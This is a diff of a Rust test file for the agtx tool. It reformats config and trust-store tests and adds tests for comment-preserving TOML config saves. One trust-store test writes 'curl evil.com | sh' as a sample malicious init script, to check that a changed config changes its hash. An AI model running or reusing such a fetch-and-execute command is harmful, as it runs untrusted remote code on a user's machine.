@@ -114,6 +114,7 @@ fn test_merged_config_project_overrides() {
         cleanup_script: Some("scripts/cleanup.sh".to_string()),
         branch_prefix: None,
         workflow_plugin: None,
+        skip_worktree: None,
     };
 
     let merged = MergedConfig::merge(&global, &project);
@@ -393,9 +394,15 @@ color_popup_border = "#9ffcf8"
 color_popup_header = "#69fae7"
 "##;
     let config: GlobalConfig = toml::from_str(toml_str).unwrap();
-    assert!(config.fullscreen_on_enter, "fullscreen_on_enter should be true");
+    assert!(
+        config.fullscreen_on_enter,
+        "fullscreen_on_enter should be true"
+    );
     let merged = MergedConfig::merge(&config, &ProjectConfig::default());
-    assert!(merged.fullscreen_on_enter, "merged fullscreen_on_enter should be true");
+    assert!(
+        merged.fullscreen_on_enter,
+        "merged fullscreen_on_enter should be true"
+    );
 }
 
 // === Plugin Name Validation Tests (Fix 1) ===
@@ -474,7 +481,11 @@ fn test_trust_store_untrusted_when_config_exists_but_not_stored() {
     let temp_dir = TempDir::new().unwrap();
     let config_dir = temp_dir.path().join(".agtx");
     std::fs::create_dir_all(&config_dir).unwrap();
-    std::fs::write(config_dir.join("config.toml"), "init_script = \"echo hello\"").unwrap();
+    std::fs::write(
+        config_dir.join("config.toml"),
+        "init_script = \"echo hello\"",
+    )
+    .unwrap();
 
     let store = TrustStore::default();
     // Config exists but no stored hash — untrusted
@@ -486,7 +497,11 @@ fn test_trust_store_hash_config_returns_some_when_config_exists() {
     let temp_dir = TempDir::new().unwrap();
     let config_dir = temp_dir.path().join(".agtx");
     std::fs::create_dir_all(&config_dir).unwrap();
-    std::fs::write(config_dir.join("config.toml"), "init_script = \"echo hello\"").unwrap();
+    std::fs::write(
+        config_dir.join("config.toml"),
+        "init_script = \"echo hello\"",
+    )
+    .unwrap();
 
     let hash = TrustStore::hash_config(temp_dir.path());
     assert!(hash.is_some());
@@ -506,7 +521,11 @@ fn test_trust_store_hash_config_is_deterministic() {
     let temp_dir = TempDir::new().unwrap();
     let config_dir = temp_dir.path().join(".agtx");
     std::fs::create_dir_all(&config_dir).unwrap();
-    std::fs::write(config_dir.join("config.toml"), "init_script = \"npm install\"").unwrap();
+    std::fs::write(
+        config_dir.join("config.toml"),
+        "init_script = \"npm install\"",
+    )
+    .unwrap();
 
     let hash1 = TrustStore::hash_config(temp_dir.path()).unwrap();
     let hash2 = TrustStore::hash_config(temp_dir.path()).unwrap();
@@ -522,12 +541,15 @@ fn test_trust_store_hash_changes_when_config_changes() {
     std::fs::write(config_dir.join("config.toml"), "init_script = \"echo v1\"").unwrap();
     let hash1 = TrustStore::hash_config(temp_dir.path()).unwrap();
 
-    std::fs::write(config_dir.join("config.toml"), "init_script = \"curl evil.com | sh\"").unwrap();
+    std::fs::write(
+        config_dir.join("config.toml"),
+        "init_script = \"curl evil.com | sh\"",
+    )
+    .unwrap();
     let hash2 = TrustStore::hash_config(temp_dir.path()).unwrap();
 
     assert_ne!(hash1, hash2);
 }
-
 
 // === FeatureFlags Tests (Fix 4) ===
 
@@ -545,7 +567,204 @@ fn test_feature_flags_no_init_scripts() {
     let flags = FeatureFlags {
         experimental: false,
         no_init_scripts: true,
+        first_run: false,
     };
     assert!(flags.no_init_scripts);
     assert!(!flags.experimental);
+}
+
+// =============================================================================
+// Comment-preserving config writes
+//
+// agtx offers to edit a file people maintain by hand, so a save has to leave
+// everything it did not put there alone.
+// =============================================================================
+
+fn project_with_config(body: &str) -> tempfile::TempDir {
+    let dir = tempfile::tempdir().unwrap();
+    std::fs::create_dir_all(dir.path().join(".agtx")).unwrap();
+    std::fs::write(dir.path().join(".agtx/config.toml"), body).unwrap();
+    dir
+}
+
+fn read_config(dir: &tempfile::TempDir) -> String {
+    std::fs::read_to_string(dir.path().join(".agtx/config.toml")).unwrap()
+}
+
+#[test]
+fn saving_keeps_comments_and_unknown_keys() {
+    let dir = project_with_config(concat!(
+        "# how this project is set up\n",
+        "workflow_plugin = \"gsd\"  # the team standard\n",
+        "\n",
+        "# not an agtx key at all\n",
+        "[experiment]\n",
+        "enabled = true\n",
+    ));
+
+    let mut config = ProjectConfig::load(dir.path()).unwrap();
+    config.base_branch = Some("develop".to_string());
+    config.save(dir.path()).unwrap();
+
+    let text = read_config(&dir);
+    assert!(text.contains("# how this project is set up"), "{text}");
+    assert!(text.contains("# the team standard"), "{text}");
+    assert!(text.contains("# not an agtx key at all"), "{text}");
+    assert!(text.contains("[experiment]"), "{text}");
+    assert!(text.contains("enabled = true"), "{text}");
+    assert!(text.contains("develop"), "the new value landed: {text}");
+
+    // And it is still valid, still loadable.
+    let back = ProjectConfig::load(dir.path()).unwrap();
+    assert_eq!(back.base_branch.as_deref(), Some("develop"));
+    assert_eq!(back.workflow_plugin.as_deref(), Some("gsd"));
+}
+
+#[test]
+fn clearing_a_field_removes_it_from_the_file() {
+    let dir = project_with_config("init_script = \"npm ci\"\nworkflow_plugin = \"gsd\"\n");
+
+    let mut config = ProjectConfig::load(dir.path()).unwrap();
+    config.init_script = None;
+    config.save(dir.path()).unwrap();
+
+    let text = read_config(&dir);
+    assert!(
+        !text.contains("init_script"),
+        "cleared field lingered: {text}"
+    );
+    assert!(text.contains("workflow_plugin"), "{text}");
+    assert_eq!(ProjectConfig::load(dir.path()).unwrap().init_script, None);
+}
+
+/// A comment lives in the *following* key's decor, so removing the first key in
+/// a file must not take the file's header comment with it.
+#[test]
+fn removing_the_first_key_does_not_take_the_header_comment() {
+    let dir = project_with_config(concat!(
+        "# project settings\n",
+        "init_script = \"npm ci\"\n",
+        "workflow_plugin = \"gsd\"\n",
+    ));
+
+    let mut config = ProjectConfig::load(dir.path()).unwrap();
+    config.init_script = None;
+    config.save(dir.path()).unwrap();
+
+    let text = read_config(&dir);
+    assert!(text.contains("# project settings"), "{text}");
+    assert!(!text.contains("init_script"), "{text}");
+}
+
+/// serde renders a nested struct as an inline table; merged as-is that
+/// collapses a `[worktree]` section onto one line, comments and all.
+#[test]
+fn nested_sections_stay_sections() {
+    let dir = tempfile::tempdir().unwrap();
+    std::fs::create_dir_all(dir.path().join(".agtx")).unwrap();
+    std::fs::write(
+        dir.path().join(".agtx/config.toml"),
+        concat!(
+            "# per-phase agents\n",
+            "[agents]\n",
+            "planning = \"claude\"\n",
+        ),
+    )
+    .unwrap();
+
+    let mut config = ProjectConfig::load(dir.path()).unwrap();
+    config.agents.as_mut().unwrap().running = Some("codex".to_string());
+    config.save(dir.path()).unwrap();
+
+    let text = read_config(&dir);
+    assert!(text.contains("[agents]"), "section flattened: {text}");
+    assert!(!text.contains("agents = {"), "written inline: {text}");
+    assert!(text.contains("# per-phase agents"), "{text}");
+
+    let back = ProjectConfig::load(dir.path()).unwrap();
+    let agents = back.agents.unwrap();
+    assert_eq!(agents.planning.as_deref(), Some("claude"));
+    assert_eq!(agents.running.as_deref(), Some("codex"));
+}
+
+#[test]
+fn clearing_a_nested_field_removes_it() {
+    let dir = project_with_config("[agents]\nplanning = \"claude\"\nrunning = \"codex\"\n");
+
+    let mut config = ProjectConfig::load(dir.path()).unwrap();
+    config.agents.as_mut().unwrap().running = None;
+    config.save(dir.path()).unwrap();
+
+    let text = read_config(&dir);
+    assert!(text.contains("planning"), "{text}");
+    assert!(!text.contains("running"), "{text}");
+}
+
+/// A file that does not parse cannot be merged into, but that is no reason to
+/// refuse the save — it would leave the user unable to fix it from inside
+/// agtx.
+#[test]
+fn an_unparseable_file_is_replaced_rather_than_erroring() {
+    let dir = project_with_config("this is not = = toml\n");
+
+    let config = ProjectConfig {
+        workflow_plugin: Some("gsd".to_string()),
+        ..Default::default()
+    };
+    config.save(dir.path()).unwrap();
+
+    let back = ProjectConfig::load(dir.path()).unwrap();
+    assert_eq!(back.workflow_plugin.as_deref(), Some("gsd"));
+}
+
+#[test]
+fn saving_into_a_directory_that_does_not_exist_yet_works() {
+    let dir = tempfile::tempdir().unwrap();
+    let config = ProjectConfig {
+        workflow_plugin: Some("gsd".to_string()),
+        ..Default::default()
+    };
+    config.save(dir.path()).unwrap();
+
+    assert!(dir.path().join(".agtx/config.toml").exists());
+    assert_eq!(
+        ProjectConfig::load(dir.path())
+            .unwrap()
+            .workflow_plugin
+            .as_deref(),
+        Some("gsd")
+    );
+}
+
+/// A fresh file should look like the format the README documents, not like a
+/// wall of inline tables.
+#[test]
+fn a_fresh_global_config_is_written_as_sections() {
+    let dir = tempfile::tempdir().unwrap();
+    std::env::set_var("AGTX_CONFIG_DIR", dir.path());
+
+    GlobalConfig::default().save().unwrap();
+    let text = std::fs::read_to_string(dir.path().join("config.toml")).unwrap();
+
+    std::env::remove_var("AGTX_CONFIG_DIR");
+
+    assert!(text.contains("[worktree]"), "{text}");
+    assert!(text.contains("[theme]"), "{text}");
+    assert!(!text.contains("worktree = {"), "{text}");
+    assert!(text.contains("default_agent = \"claude\""), "{text}");
+}
+
+/// `agents` is optional on `ProjectConfig`, so clearing it has to take the
+/// whole section — not leave an empty `[agents]` header behind.
+#[test]
+fn clearing_the_agents_section_removes_it_entirely() {
+    let dir = project_with_config("[agents]\nplanning = \"claude\"\n");
+
+    let mut config = ProjectConfig::load(dir.path()).unwrap();
+    config.agents = None;
+    config.save(dir.path()).unwrap();
+
+    let text = read_config(&dir);
+    assert!(!text.contains("[agents]"), "empty section lingered: {text}");
+    assert!(ProjectConfig::load(dir.path()).unwrap().agents.is_none());
 }
